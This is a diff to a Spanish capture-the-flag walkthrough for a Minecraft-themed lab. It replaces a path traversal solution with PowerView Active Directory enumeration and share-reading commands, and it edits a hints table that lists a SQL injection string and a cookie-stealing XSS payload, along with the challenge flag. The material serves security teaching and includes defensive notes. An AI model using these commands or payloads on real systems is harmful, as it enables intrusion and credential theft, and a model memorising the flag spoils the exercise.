@@ -182,16 +182,37 @@ Este documento contiene la metodología de resolución paso a paso de los 9 desa
 ---
 
 ###  Desafío 3: Huevo de Dragón
-- **Tema Académico:** *6º Semestre — Evasión de Honeypots y Path Traversal (LFI).*
-- **Herramientas Kali Linux:** `curl`, Navegador.
-- **Procedimiento de Explotación:**
-  1. La consulta al archivo por defecto `honeypot/fake_egg.txt` activa el señuelo.
-  2. Utilizar Path Traversal para salir del directorio web `/var/www/` y leer el archivo auténtico de superusuario:
-     ```bash
-     curl "http://localhost:8080/end/egg/inspect?altar_file=../../root/real_dragon_egg.txt"
+- **Tema Académico:** *Seguridad en la Nube — Enumeración de Active Directory con PowerView.*
+- **Herramientas:** Navegador (consola PowerView simulada) o PowerShell + PowerView en un laboratorio AD real.
+- **Contexto:** El Huevo de Dragón fue archivado en el dominio `end.local`. La consola de The End implementa un motor PowerView simulado: no ejecuta PowerShell ni accede al sistema de archivos del contenedor.
+- **Procedimiento de Enumeración:**
+  1. Confirma el dominio y su controlador:
+     ```powershell
+     Get-NetDomain
+     Get-NetDomainController
      ```
+  2. Enumera las cuentas de usuario y revisa sus descripciones:
+     ```powershell
+     Get-NetUser
+     ```
+     La cuenta de servicio `svc_backup` describe el vault en `\\END-FS01\vault`.
+  3. Confirma qué cuentas pertenecen al grupo que protege el recurso:
+     ```powershell
+     Get-NetGroupMember -GroupName "End Vault Admins"
+     ```
+  4. Descubre los recursos compartidos del dominio:
+     ```powershell
+     Find-DomainShare
+     ```
+     Aparece `\\END-FS01\vault` como almacén del Huevo de Dragón.
+  5. Lee el archivo del Huevo con la ruta UNC completa:
+     ```powershell
+     Get-Content \\END-FS01\vault\real_dragon_egg.txt
+     ```
+  6. Alternativas de apoyo: `Get-NetShare -ComputerName END-FS01`, `Get-NetComputer` e `Invoke-UserHunter` para confirmar la sesión de `svc_backup` en el servidor de archivos.
 - **Bandera Obtenida:**
   `FLAG{MINECRAFT_FINAL_DRAGON_EGG_VICTORY_GG}`
+- **Nota pedagógica:** En un AD real, este flujo demuestra por qué las descripciones de cuentas de servicio no deben exponer rutas internas y por qué los shares deben aplicar mínimo privilegio. La defensa incluye cuentas gMSA, ACLs por grupo, segmentación del servidor de archivos y monitorización de consultas LDAP/SMB.
 
 ---
 
@@ -216,7 +237,7 @@ la sintaxis y construir el payload él mismo.
 | `' OR 1=1 --` listo para pegar | *"Hay dos condiciones unidas por un operador. Haz que la primera siempre sea cierta y comenta el resto"* |
 | `<script>fetch('/nether/gold/leak?cookie='+document.cookie)</script>` | *"La nota se renderiza como HTML. El bot ya expone un endpoint receptor en el propio servidor"* |
 | `CVE-2026-OVERLOAD_CRYSTALS` | *"El proveedor y el año suelen estar escritos en el propio token de la backdoor"* |
-| `../../root/real_dragon_egg.txt` | *"Hay dos ficheros que parecen el premio; uno es un señuelo colocado para que lo encuentres demasiado fácil"* |
+| `Get-Content \\END-FS01\vault\real_dragon_egg.txt` | *"Las descripciones de cuentas de servicio pueden revelar recursos internos; enumera el dominio, sus grupos y sus shares"* |
 | `tr 'A-Za-z' 'N-ZA-Mn-za-m'` | *"Un cifrado por sustitución que lleva el nombre de un emperador romano"* |
 
 Los botones ** Ver Código** se mantienen: la divulgación del código fuente vulnerable
